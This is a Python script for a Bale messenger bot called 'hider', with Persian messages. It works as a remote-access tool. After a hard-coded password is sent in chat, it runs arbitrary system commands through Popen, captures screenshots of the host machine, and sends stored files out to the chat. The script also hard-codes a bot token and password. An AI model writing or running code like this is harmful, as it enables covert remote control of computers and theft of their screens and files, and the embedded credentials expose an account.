from bale import *
from data_base import Hider
import os
import pyautogui as ui
from subprocess import Popen

ui.FAILSAFE = False


def hider_bot():

    token = "862736720:p6vkVNYywTVcvA1q6Ovrrhw61lSteuJK9h4gmbsH"

    bot = Bot(token="862736720:p6vkVNYywTVcvA1q6Ovrrhw61lSteuJK9h4gmbsH")

    data_base = Hider()

    pass_word = "MRT_datas"

    admins = []

    @bot.event
    async def on_message(message=Message):

        chat_id = str(message.chat_id)

        command = str(message.content)

        if chat_id in admins:

            if command == "/data_list":

                base_text = """
                لیست داده های موجود در پایگاه داده 🔆⚠️:

                """

                imog = """
                ❇️
                """

                data_list = data_base.get_list()

                for i in data_list:

                    base_text = base_text + imog + i

                await message.reply(text=base_text)

            elif command == "/screen_shot":

                image = ui.screenshot()

                image.save("screen.png")

                file = open(f"{os.getcwd()}\\screen.png", "rb")

                file = InputFile(file=file)

                await message.reply_document(
                    document=file, caption="اسکرین شات از صفحه شما⚔️💬💡🤩"
                )

                os.remove(f"{os.getcwd()}\\screen.png")

            elif command == "/data_count":

                count = str(len(data_base.get_list()))

                text = "تعداد داده های شما:"

                imoge = """🔓💬📝"""

                await message.reply(text=text + " " + count + " " + imoge)

            elif "/cmd:" in command:

                cmd = command.replace("/cmd:", "")

                Popen(cmd)

                await message.reply(text="دستور سیستمی انجام شد🫡🗿🔍")

            elif command == "/exit" or command == "/off":

                await message.reply(text="ربات خاموش شد📴📴⚠️⚠️")

                os._exit(1)

            elif "/load_in_pc:" in command:

                base = command.replace("/load_in_pc:", "")

                name = base.split(",")[0]

                format = base.split(",")[1]

                if name not in data_base.get_list():

                    await message.reply(
                        text="""
                    فایل مورد نظر یافت نشد ⚠️❗️
                    """
                    )

                data_base.load(name, format)

                file = open(f"{os.getcwd()}\\{name}.{format}", "rb")

                file = InputFile(file=file)

                await message.reply_document(
                    file=file,
                    caption="فایل مورد نظر در سیستم لود و موجود می‌باشد 👍💬🤖😎😎",
                )

            elif "/load:" in command:

                slug = command.replace("/load:", "")

                name = slug.split(",")[0]

                if name not in data_base.get_list():

                    await message.reply(
                        text="""
                    فایل مورد نظر یافت نشد ⚠️❗️
                    """
                    )

                format = slug.split(",")[1]

                data_base.load(name, format)

                file = open(f"{os.getcwd()}\\{name}.{format}", "rb")

                doct = InputFile(file=file, file_name=name)

                file.close()

                os.remove(f"{os.getcwd()}\\{name}.{format}")

                await bot.send_document(chat_id=chat_id, document=doct)

        else:

            if message.content == pass_word:

                admins.append(chat_id)

                await message.reply(
                    text="""سلا محمدرضا پسورد درست بود💬⚔️
به ربات hider خوش اومدی 🤖😈"""
                )

            else:

                await message.reply(
                    text="""
                متاسفم شما مجوز ورود به سیستم را ندارید 🛠⚙🚫🚷
                """
                )

    bot.run()


hider_bot()
